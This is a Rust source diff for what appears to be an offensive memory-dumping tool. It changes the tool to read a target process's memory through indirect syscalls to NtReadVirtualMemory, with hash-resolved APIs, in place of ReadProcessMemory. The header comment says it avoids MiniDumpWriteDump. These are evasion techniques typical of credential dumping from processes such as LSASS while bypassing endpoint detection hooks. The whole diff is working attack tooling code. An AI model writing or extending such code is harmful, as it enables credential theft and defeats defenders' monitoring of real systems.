@@ -8,8 +8,9 @@
 //! Avoids MiniDumpWriteDump entirely — uses only NtReadVirtualMemory.
 
 use crate::crypto;
+use crate::resolver::{self, ApiResolver};
+use crate::syscall;
 use windows::Win32::Foundation::*;
-use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
 use windows::Win32::System::Memory::*;
 use windows::Win32::System::SystemInformation::*;
 use windows::Win32::System::Threading::*;
@@ -126,6 +127,7 @@ struct ModuleInfo {
 
 /// Create a minidump of the target process
 pub fn create_minidump(
+    api: &ApiResolver,
     process: HANDLE,
     _pid: u32,
     output_path: &str,
@@ -143,7 +145,8 @@ pub fn create_minidump(
 
     // 3. Read committed memory regions
     println!("    Reading memory regions (this may take a moment)...");
-    let regions = read_memory_regions(process).map_err(|e| format!("Memory read failed: {}", e))?;
+    let regions =
+        read_memory_regions(api, process).map_err(|e| format!("Memory read failed: {}", e))?;
 
     let total_mem: u64 = regions.iter().map(|r| r.size).sum();
     println!(
@@ -252,9 +255,13 @@ fn enumerate_modules(process: HANDLE) -> Result<Vec<ModuleInfo>, String> {
     Ok(modules_out)
 }
 
-fn read_memory_regions(process: HANDLE) -> Result<Vec<MemRegion>, String> {
+fn read_memory_regions(api: &ApiResolver, process: HANDLE) -> Result<Vec<MemRegion>, String> {
     let mut regions = Vec::new();
     let mut address: u64 = 0;
+
+    // Resolve NtReadVirtualMemory SSN for indirect syscall
+    let nrvm_entry = syscall::resolve_ssn(api, resolver::HASH_NT_READ_VIRTUAL_MEMORY)
+        .ok_or("Failed to resolve NtReadVirtualMemory SSN")?;
 
     unsafe {
         loop {
@@ -285,15 +292,26 @@ fn read_memory_regions(process: HANDLE) -> Result<Vec<MemRegion>, String> {
                 let mut buffer = vec![0u8; region_size];
 
                 let mut bytes_read = 0usize;
-                let read_ok = ReadProcessMemory(
-                    process,
-                    mbi.BaseAddress,
-                    buffer.as_mut_ptr() as *mut _,
-                    region_size,
-                    Some(&mut bytes_read),
-                );
+                // NtReadVirtualMemory via indirect syscall
+                // NTSTATUS NtReadVirtualMemory(
+                //   HANDLE ProcessHandle,      // rcx
+                //   PVOID BaseAddress,          // rdx
+                //   PVOID Buffer,               // r8
+                //   SIZE_T NumberOfBytesToRead,  // r9
+                //   PSIZE_T NumberOfBytesRead    // [rsp+0x28]
+                // )
+                let status = unsafe {
+                    syscall::indirect_syscall5!(
+                        nrvm_entry,
+                        process.0 as u64,
+                        mbi.BaseAddress as u64,
+                        buffer.as_mut_ptr() as u64,
+                        region_size as u64,
+                        &mut bytes_read as *mut usize as u64
+                    )
+                };
 
-                if read_ok.is_ok() && bytes_read > 0 {
+                if status >= 0 && bytes_read > 0 {
                     buffer.truncate(bytes_read);
                     regions.push(MemRegion {
                         base: mbi.BaseAddress as u64,
